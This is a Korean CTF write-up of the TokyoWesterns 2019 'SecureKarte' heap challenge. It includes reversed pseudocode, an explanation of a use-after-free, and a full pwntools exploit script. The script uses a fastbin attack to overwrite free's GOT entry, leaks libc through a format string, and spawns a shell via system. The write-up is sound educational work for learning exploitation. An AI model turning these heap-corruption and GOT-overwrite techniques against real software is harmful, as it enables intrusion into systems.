---
title: TokyoWestern CTF 2019 - SecureKarte
categories:
 - pwnable
tags: heap, calloc, fastbin, pwn , tokyoWestern
---

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference

## Introduction

마지막으로 noleak을 풀다가 ida 없는걸로 현타오고... 군생활 아직 엄청 많이 남았다는거에 추가타..

websec도 hard문제 2개랑 몇개 남긴 했는데 잘 풀려지지도 않고.. 그래서 다른 블로그 참고해서 웹 ctf문제들 풀려고 하는데 pwnable이랑 다르게 세팅할게 너무 많아서 잠깐 소강상태일때 이 문제를 풀었다.

codegate, hitcon, tokyowesterns ctf들 2019, 2020년도 문제 얼른 풀어봐야 되는데.. 커널이나 리버싱문제를 건드릴 수 없어서 너무 답답하다.. 핑계인가... 최근에 자꾸 맥북이 마렵다... ㅠㅡㅠ

tistory에서 github.io로 넘어왔을때 다 좋았는데 한 가지 아쉬웠던게.. 방문자 수 조회가 안되니까 조오오오금 많이 아쉽다. 뭔가 조회수 보는 맛이 조금은 있었는데...

여튼! 문제풀이를 시작하겠다. (이 문제도 중간에 풀다가 calloc때문에 답도 없어서 writeup을 봤다..)


## Vunlnerability

```
 _______  _______  _______  __   __  ______    _______    ___   _  _______  ___      _______  _______ 
|       ||       ||       ||  | |  ||    _ |  |       |  |   | | ||   _   ||   |    |       ||       |
|  _____||    ___||       ||  | |  ||   | ||  |    ___|  |   |_| ||  |_|  ||   |    |_     _||    ___|
| |_____ |   |___ |       ||  |_|  ||   |_||_ |   |___   |      _||       ||   |      |   |  |   |___ 
|_____  ||    ___||      _||       ||    __  ||    ___|  |     |_ |       ||   |___   |   |  |    ___|
 _____| ||   |___ |     |_ |       ||   |  | ||   |___   |    _  ||   _   ||       |  |   |  |   |___ 
|_______||_______||_______||_______||___|  |_||_______|  |___| |_||__| |__||_______|  |___|  |_______|


Input patient name... 12
OK.

MENU (patient : CENSORED)
!#!#!#!#!#!#!#!#!#
1.  Add
2.  Show
3.  Delete
4.  Modify
99. Rename patient
0.  Exit
!#!#!#!#!#!#!#!#!#
> 


Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
	
	
```

```
init(0x4008b7)

    setbuf(stdout, 0)
    zfd = open("/dev/zero", 0)
    rfd = open("/dev/urandom", 0)
    key = getrand()
        read(rfd, rbp-0x10, 0x8)
        return [rbp-0x10]
    
    lock = key



getint()
    
    return atoi(getnline(rbp-0x30, 0x20))
    
getnline(addr, len)
    
    [rbp-0x18] = addr
    [rbp-0x1c] = len
    
    if [rbp-0x18] == 0 or [rbp-0x1c] <= 0:
        return 0
    
    [rbp-0x10] = read(0, [rbp-0x18], [rbp-0x1c]-1)
    
    if [rbp-0x10] == 0:
        return -1
    
    BYTE PTR [[rbp-0x18] + [rbp-0x1c]-1] = 0
    
    
    [rbp-0x8] = strchr([rbp-0x18], 0x0a)
    
    if [rbp-0x8] != 0:
        BYTE PTR [[rbp-0x8]] = 0
        
    return 1
    



main(0x40095b)
    
        if [0x602120](zfd) == -1:
            return
            
        if [0x602124](rfd) == -1:
            return
        
        
        patient:
        
        puts("Input patient name...")
        
        getnline(0x6021a0, 0x40)


        while True:
        
        
            [rbp-0x4] = menu()
            
            if [rbp-0x4] == 0:
                break
            
            if [rbp-0x4] == 1: // add
            
                add()
                    
                    for ([rbp-0x1c] = 0; [rbp-0x1c] <= 0x2; [rbp-0x1c]++):
                
                        if [0x602140 + [rbp-0x1c] << 0x4] == 0:
                            
                            printf("Input size > ")
                            [rbp-0x10] = getint()
                                
                                
                            
                            if [rbp-0x10] <= 0x800:
                                
                                [rbp-0x8] = calloc(1, [rbp-0x10])
                            
                            elif:
                                
                                [rbp-0x8] = malloc([rbp-0x10])
                                
                            
                            if [rbp-0x8] == 0:
                                
                                puts("alloction failed...")
                                return
                            
                            if [rbp-0x10] > 0x800:
                            
                                read([0x602120](zfd), [rbp-0x8], [rbp-0x10])
                                
                            printf("Input description > ")
                            
                            getnline([rbp-0x8], [rbp-0x10])
                            
                            [rbp-0x18] = getrand() & 0xffff
                            
                            for ([rbp-0x14] = 0; [rbp-0x14] <= 2; [rbp-0x14]++):
                                
                                if [0x602144 + [rbp-0x14] << 0x4] == [rbp-0x18]:
                                    
                                    if [0x602140 + [rbp-0x14] << 0x4] != 0:
                                        [rbp-0x18] = getrand() & 0xffff // id
                                        
                            
                            [0x602144 + [rbp-0x1c] << 0x4] = [rbp-0x18] // id
                            
                            BYTE PTR [0x602140 + [rbp-0x1c] << 0x4] = 1 // flag 0 to 1
                            
                            [0x602148 + [rbp-0x1c] << 0x4] = [rbp-0x8]
                            
                            printf("Added id %d\n", [rbp-0x18])
                            
                            
                            
                            
                                
                    
                    
                    puts("karte is full!!")
                    
                    return        
                    
                    
                    
                
            
            elif [rbp-0x4] == 2: // show
                
                puts("no..")
                
            
            elif [rbp-0x4] == 3: // delete
            
                delete()
                    
                    printf("Input id > ")
                    [rbp-0x4] = getint()
                    
                    for([rbp-0x8] = 0; [rbp-0x8] <= 0x2; [rbp-0x8]++):
                        
                        if [rbp-0x4] != [0x602144 + [rbp-0x8] << 0x4]: // id check
                            continue
                        
                        if [0x602140 + [rbp-0x8] << 0x4] == 0: // flag check
                            continue
                        
                        BYTE PTR [0x602140 + [rbp-0x8] << 0x4] = 0 // flag 1 to 0
                        free([0x602148 + [rbp-0x8] << 0x4])
                        printf("Deleted id %d\n", [rbp-0x4])
                        
                        return
                        
                    puts("karte not found...")
                    
                    
            
            
            elif [rbp-0x4] == 4: // modify
                
                modify()
                    
                    if [0x602190](key) != [0x602170](lock):
                        puts("Hey! You can't modify karte any more!!")
                        return
                    
                    printf("Input id > ")
                    [rbp-0x4] = getint()
                    
                    for([rbp-0x8] = 0; [rbp-0x8] <= 0x2; [rbp-0x8]++):
                        
                        if [0x602144 + [rbp-0x8] << 0x4] != [rbp-0x4]: // id check
                            continue
                        
                        [0x602190](key) = 0xdeadc0bebeef
                        printf("Input new description")
                        
                        getnline([0x602148 + [rbp-0x8] << 0x4], strlen([0x602148 + [rbp-0x8] << 0x4])+1)
                        
                        printf("Modified id %d\n", [rbp-0x4])
                        
                
            
            
            elif [rbp-0x4] == 0x63: // Rename patient
            
                goto patient
            
            
            puts("Done.")
            
        
        puts("Bye!")
```

대략적으로 python과 c를 섞은 sudo코드로 만들어보았다.

먼저 취약점은 3번에서 flag 검증을 하지않는 부분에서 발생한다. 이 때문에 free된 chunk에 값을 쓸 수 있는데 문제는 두번째 인자로 strlen의 리턴값을 넣는다는 것을 유의하도록 하자.

추가적으로 2번을 보면 현재 활성화 되어있는 chunk들을 볼 수 없다.

## Exploit

익스를 설명하기 앞서서 이 문제는 glibc 2.27이상, tcache가 있는 버전이고 버전에 비해서 PIE와 FULL RELRO가 안걸려있는 것을 확인할 수 있다. 이로써 찐따마냥 `__malloc_hook` 이나 `__free_hook` overwrite 안하고 got overwrite로 문제를 풀 수 있다.

tcache가 있어서 3번 modify기능을 이용해서 fd를 조작 후 바로 할당받으려고 했던 필자는 `calloc`에 당해버렸다.

`calloc` 내부적으로 `_int_malloc`을 호출하기 때문에 tcache에서 할당하지 않는다.

롸업을 참고한 결과 `fastbin unlink attack`으로 진행하면 됬다. 따라서 0x7f gadget을 찾아서 size부분에 있는 주소를 넣어서 할당해주면 원하는 값을 원하는 곳에 쓸 수 있게 된다.

제약은 위에서 말한 0x7f gadget이 있는 곳에만 write가 가능하다는거..? 자세한 익스는 밑의 코드를 참고부탁한다.

이어서 libc leak을 해야되는데... 이것도 전혀 생각지도 못한 `free` got를 `printf` plt로 overwrite 한 후 FSB을 이용해서 leak을 구할 수 있었다.

마지막 `system("/bin/sh")`는 `free` got를 overwrite해서 `system`함수로 넣은 후 진행하면 된다.


## slv.py

```python
from pwn import *

p = process("./karte")
e = ELF("./karte")


sla = lambda c,s : p.sendlineafter(c, str(s))
sa = lambda c,s : p.sendafter (c, str(s))
sl = lambda s : p.sendline(str(s))
s = lambda s : p.send(str(s))


free_plt_addr = e.plt['free']
free_got_addr = e.got['free']
puts_plt_addr = e.plt['puts']
printf_plt_addr = e.plt['printf']
system_offset = e.libc.symbols['system']


def add(size, description):
    
    sleep(0.1)
    
    sa('> ', 1)
    
    sa('> ', size)
    
    sa('> ', description)
    
    id = p.recvuntil('Done.').split('Done.')[0].split(' ')[2]
    
    return int(id)


def delete(id):
    
    sleep(0.1)
    
    sa('> ', 3)
    
    sa('> ', id)
    
    return


def modify(id, description):
    
    sleep(0.1)
    
    sa('> ', 4)
    
    sa('> ', id)
    
    sa('> ', description)
    
    return


def rename(name):
    
    sleep(0.1)
    
    sa('> ', 99)
    
    sa('... ', name)
    
    return


def main():
    
    name = ''
    name += p64(0)
    name += p64(0x71)
    name += p64(0x602155)
    
    sa('... ', name)
    
    for i in range(7):
        
        id0 = add(0x60, '1234')
        delete(id0)
        
        
    id1 = add(0x60, '1234')
    id2 = add(0x21000, '1234')
    id3 = add(0x60, '1234')
    
    delete(id1)
    delete(id3)
    
    
    payload = ''
    payload += p32(0x602155)
    
    modify(id3, payload)
    
    
    payload = ''
    payload += '%13$p' # for FSB
    id1 = add(0x60, payload) # allocate heap addr
    
    delete(id2)
    
    
    payload = ''
    payload += 'a'*0xb # padding
    payload += p64(0x0000deadc0bebeef) # allocate at lock
    
    id2 = add(0x60, payload) # allocate 0x602165
    
    
    payload = ''
    payload += '\x00'*3
    payload += p64(free_got_addr)
    
    modify(id2, payload) # overwrite third addr to free_got
    
    
    payload = ''
    payload += p64(printf_plt_addr)[:-2]
    
    modify(id3 & 0xff, payload) # overwrite free_got to printf_plt
    
    
	delete(id1) # call printf("%13$p")
    
	
    libc_base = int(p.recvuntil('Deleted').split('0x')[1][:12], 16) - 0x21b97
    log.info('libc_base : ' + hex(libc_base))
    system_addr = libc_base + system_offset
    
    
	payload = ''
    payload += p32(0x400706)[:-1]
    
    modify(id3 & 0xff, payload)
    
    
	id1 = add(0x20, '/bin/sh\x00')
    
    
	delete(id1)
    
	
    payload = ''
    payload += p64(system_addr)[:-2]
    
    modify(id3 & 0xff, payload)
    
	
    id1 = add(0x20, '/bin/sh\x00')
    
    delete(id1)
    
    p.interactive()
    
    return


if __name__ == '__main__':
    main() 
	
```

마지막에 `printf`를 통해서 libc 주소를 얻은 후에 `free`에 `system`주소를 바로 넣으려고 하면 byte수가 안맞기 때문에 `printf_plt` 주소로 설정한 것을 다시 `free_plt`+6 주소로 바꿔서 `free`를 한번 실행시켜줘서 `free` 주소를 할당받게 해서 바이트 수를 맞추고 `modify`를 이용해 `system`주소로 overwrite 했다.

0x7f gadget을 이용해서 exploit 설계하는 점만 빼면 변태스러운 문제는 아니였다.




추가적으로 `calloc` 내부를 살펴보면서 tcache가 할당되지 않는 이유를 살펴보자.

```c
void *
__libc_calloc (size_t n, size_t elem_size)
{
  mstate av;
  mchunkptr oldtop, p;
  INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;
  void *mem;
  unsigned long clearsize;
  unsigned long nclears;
  INTERNAL_SIZE_T *d;
  /* size_t is unsigned so the behavior on overflow is defined.  */
  bytes = n * elem_size;
  
  .
  .
  .
  
  mem = _int_malloc (av, sz);
  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||
          av == arena_for_chunk (mem2chunk (mem)));
  if (!SINGLE_THREAD_P)
    {
      if (mem == 0 && av != NULL)
        {
          LIBC_PROBE (memory_calloc_retry, 1, sz);
          av = arena_get_retry (av, sz);
          mem = _int_malloc (av, sz);
        }
      if (av != NULL)
        __libc_lock_unlock (av->mutex);
    }
  /* Allocation failed even after a retry.  */
  if (mem == 0)
    return 0;
  .
  .
  .
  
}

```
`_int_malloc`을 보면

```c

static void *
_int_malloc (mstate av, size_t bytes)
{
  .
  .
  .
  
  
  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          size = chunksize (victim);
          mchunkptr next = chunk_at_offset (victim, size);
          if (__glibc_unlikely (size <= 2 * SIZE_SZ)
              || __glibc_unlikely (size > av->system_mem))
            malloc_printerr ("malloc(): invalid size (unsorted)");
          if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
              || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
            malloc_printerr ("malloc(): invalid next size (unsorted)");
          if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
            malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
          if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
          if (__glibc_unlikely (prev_inuse (next)))
            malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */
          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }
              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
          /* Take now instead of binning if exact fit */
          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                set_non_main_arena (victim);
#if USE_TCACHE
              /* Fill cache first, return to user only if cache fills.
                 We may return one of these chunks later.  */
              if (tcache_nb
                  && tcache->counts[tc_idx] < mp_.tcache_count)
                {
                  tcache_put (victim, tc_idx);
                  return_cached = 1;
                  continue;
                }
				
				.
				.
				.
				
#if USE_TCACHE
      /* If we've processed as many chunks as we're allowed while
         filling the cache, return one of the cached ones.  */
      ++tcache_unsorted_count;
      if (return_cached
          && mp_.tcache_unsorted_limit > 0
          && tcache_unsorted_count > mp_.tcache_unsorted_limit)
        {
          return tcache_get (tc_idx);
        }
#endif
#define MAX_ITERS       10000
          if (++iters >= MAX_ITERS)
            break;
        }
#if USE_TCACHE
      /* If all the small chunks we found ended up cached, return one now.  */
      if (return_cached)
        {
          return tcache_get (tc_idx);
        }
		
				.
				.
				.
				
}
```

위의 코드를 보면 `retrun_cached`가 0이면 안되고 tcache를 리턴해주는 `tcache_get` 함수의 호출이 `fastbin`, `smallbin`, `unsortedbin`을 다 돌면서 조건이 안맞을 경우에 뒷부분에서 할당하는 것을 볼 수 있다.

문제의 조건에서 heap할당을 3개밖에 못하는것을 감안했을때 `calloc`을 통해 tcache를 할당할 수 있는 방법이 없었다는 것을 확인할 수 있었다.

필자는 `calloc`내부를 분석해서 `_int_malloc`이 나오길래 `_int_malloc`을 분석해서 `tcache`를 리턴하게 되는 조건을 찾아서 진행하는 줄 알았다가 롸업보고 뒤통수 맞은 느낌이었다..


## 느낀 점

개인적으로 이 문제 풀면서 지렸던 점을 꼽자면 

첫번째로 `fasbin unlink attack`으로 익스 진행했다는 점

두번째로 `lock` 주소에서 할당받기 전에 2번째 list를 delete해서 0x7f gadget은 사용하면서 list자리까지 사용하는 부분..

마지막으로 `printf`로 FSB를 이용해 libc leak을 진행하는 점... ㄷㄷ

정진하자!


## Reference

- [https://ctftime.org/writeup/16353](https://ctftime.org/writeup/16353)